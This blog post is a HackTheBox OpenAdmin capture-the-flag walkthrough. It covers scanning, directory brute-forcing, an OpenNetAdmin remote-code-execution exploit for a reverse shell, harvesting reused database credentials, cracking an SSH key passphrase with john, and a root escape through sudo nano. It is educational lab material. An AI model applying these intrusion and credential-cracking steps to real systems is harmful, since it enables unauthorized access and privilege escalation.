---
date: 2020-05-02 23:48:05
layout: post
title: HackTheBox OpenAdmin Writeup
subtitle: Hackthebox OpenAdmin Writeup.
description: >-
  in this blog i've explained how to solve openadmin machine in hackthebox
image: https://pbs.twimg.com/media/ENXDIZYX0AAIur8.jpg
optimized_image: https://pbs.twimg.com/media/ENXDIZYX0AAIur8.jpg
category: hackthebox
tags:
  - hackthebox
  - openadmin
author: Ahmed Fatouh
paginate: true
---



## [](#header-4)Methodology:
*   Nmap Scan.
*   Directory Listing With Gobuster.
*   Web Reverse Shell with Exploit-DB.
*   Find interesting files and Got some Credentials.
*   Got The Seconed User.
*   Privilege Escalation.


### [](#header-3)Nmap Scan:
we will start with nmap scan for ports and it's services.
i found 2 ports opened in this machine >> 80,22.
This ports for >> 80 for http service >> 22 for SSH service.

```ruby
nmap -sC -sV 10.10.10.171 -v -oN scan.txt
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:42
Completed NSE at 03:42, 0.00s elapsed
Initiating NSE at 03:42
Completed NSE at 03:42, 0.00s elapsed
Initiating NSE at 03:42
Completed NSE at 03:42, 0.00s elapsed
Initiating Ping Scan at 03:42
Scanning 10.10.10.171 [2 ports]
Completed Ping Scan at 03:42, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:42
Completed Parallel DNS resolution of 1 host. at 03:42, 13.00s elapsed
Initiating Connect Scan at 03:42
Scanning 10.10.10.171 [1000 ports]
Discovered open port 80/tcp on 10.10.10.171
Discovered open port 22/tcp on 10.10.10.171
Increasing send delay for 10.10.10.171 from 0 to 5 due to 37 out of 122 dropped probes since last increase.
Completed Connect Scan at 03:43, 23.25s elapsed (1000 total ports)
Initiating Service scan at 03:43
Scanning 2 services on 10.10.10.171
Completed Service scan at 03:43, 6.32s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.171.
Initiating NSE at 03:43
Completed NSE at 03:43, 8.07s elapsed
Initiating NSE at 03:43
Completed NSE at 03:43, 1.02s elapsed
Initiating NSE at 03:43
Completed NSE at 03:43, 0.00s elapsed
Nmap scan report for 10.10.10.171
Host is up (0.30s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 03:43
Completed NSE at 03:43, 0.00s elapsed
Initiating NSE at 03:43
Completed NSE at 03:43, 0.00s elapsed
Initiating NSE at 03:43
Completed NSE at 03:43, 0.00s elapsed
```

# [](#header-1)Let's Check The Web Page on Ports 80/443.

![](https://i.ibb.co/NyvCrgv/apachepage.png)
Nothing to do so we need to bruteforce the directories.

### [](#header-3)Directory Listing using Gobuster:
```ruby
now we will use gobuster to bruteforce the directory in our server.
sudo gobuster dir -u http://10.10.10.171/ -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/23 03:58:22 Starting gobuster
===============================================================
/artwork (Status: 301)
/index.html (Status: 200)
Progress: 2073 / 4615 (44.92%)
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
Progress: 2374 / 4615 (51.44%)================================
/music (Status: 301)
/server-status (Status: 403)
/ona (Status: 301)

```
# [](#header-1) Let's check the http://10.10.10.171/music

![](https://i.ibb.co/WGMr9Vj/onapage.png)

there is nothing in this page so let's go to ona page.

# [](#header-1) Checking http://10.10.10.171/ona

![](https://i.ibb.co/1L7vJgC/ona2page.png)

so first i try login with admin:admin and it's worked so there something interested in this page and let's go to Download page.

# [](#header-1) Download Page:

![](https://i.ibb.co/2jcC0ZG/downloadpage.png)

and from here we know that this service is a OpenNetAdmin! so what is it? 
OpenNetAdmin is an opensource IP Address Management (IPAM) system.
so let's search for any exploits for OpenNetAdmin.

# [](#header-1) Exploitation.
when i searched for exploits for opennetadmin i found this exploit >> [https://www.exploit-db.com/exploits/47691](Exploit).
let's download the exploit and run it .
## []()Reverse Shell.
![](https://i.ibb.co/F3HKDfG/reverseshell.png)

## [](#header-5)Escalate To the First User.

1.  first thing you will found that you don't know where you should search for any credentials..
2.  so we will use the find command.
3.  find / -type d -user www-data


## [](#header-2)Hunt files with Find:
> find - is a linux command to find anything like file or directory.
  The first argument  / is the place to perform the search
 -type - It takes f or d resembling what we are searching >> f - For files >> d - For directories.
 -user - This tells in connection to which user. This command will search all the files that have permission for www-data under >(complete file system)

### [](#header-5) **Credentials**:

1. when we used the find command we will find some interesting files.
![](https://i.ibb.co/8jtx6YN/find.png)
2. first let's list the dirs in /opt/ona/www/


![](https://i.ibb.co/k1GmK7s/dir.png)


3. then let's list the dirs in config file beacause we know that the configuration files contain creds or any interesting things.


![](https://i.ibb.co/QCHXvBT/config.png)


check the content of the config.inc.php file and you will found this line >> $dbconffile = "{$base}/local/config/database_settings.inc.php";

so let's go to check this file.

### []() MySql Credentials:

![](https://i.ibb.co/Qntm2Vh/db.png)


now we Found the mysql login user password: n1nj4W4rri0R ! >> try this password with our users.
we have in this machine 2 users and the root >> jimmy >> joanna >> root.
Let's try the password with the 2 users .
The password worked with Jimmy.


![](https://i.ibb.co/X4LqhWj/firstuser.png)


# [](#header-1) Joanna SSH key and Login with it:

The first thing i do i go to /var/www and i found dir with the name internal and i open it and found the main.php file 
and i will show you the content of the file and the error when open it with php.


![](https://i.ibb.co/86xjT9D/perm.png)

* from the php code we know that the output will be the ssh key of Joanna.

* in this point i used curl to see the content of the main.php page.

* first we will use the netstat command to know which port this service running on.

![](https://i.ibb.co/rdtBxwj/netstat.png)

* and let's curl the main php with the port:52846 "after trying with the another ports".\

![](https://i.ibb.co/yYLp6yL/curl.png)

and we found the ssh key for joanna >> boom let's decrypt it with ssh2john and john.

#### [](#header-4) Login With Joanna

*   After we got the private key we will decrypt it.
*   /usr/share/john/ssh2john.py joanna_rsa > joanna_rsa.txt
*   john --wordlist=/usr/share/wordlists/rockyou.txt.gz joanna_rsa.txt
*   The Paswword IS : bloodninjas.
*    login via the ssh key and it's password.

![](https://i.ibb.co/wr76grR/bloodninjas.png)

![](https://i.ibb.co/PDvXDfr/firstflag.png)


# [](#header-1)Privilege Escalation:
first i use **sudo -l** and i found >>

![](https://i.ibb.co/sszf2M4/sudo.png)

we can run this command as root /bin/nano /opt/priv without password.


## [](#header-4)Nano Exploitation:

*   sudo -u root /bin/nano /opt/priv.
*   Ctrl+R,Ctrl+X .
*   you can get root shell with this command "reset; sh 1>&0 2>&0" or you can read the root flag with this command "cat /root/root.txt".


![](https://i.ibb.co/xgqbwZv/finally.png)


* Reference:
[https://gtfobins.github.io/gtfobins/nano/](Nano exploitation command in gtfobins),
[https://www.exploit-db.com/exploits/47691](OpneNetAdmin Exploit),
[https://opennetadmin.com/](OpenNetAdmin).


* if you want support me to do more WriteUp's Buy me a coffe.[https://www.buymeacoffee.com/XDev05]()

<script src="https://www.hackthebox.eu/badge/103789"></script> 
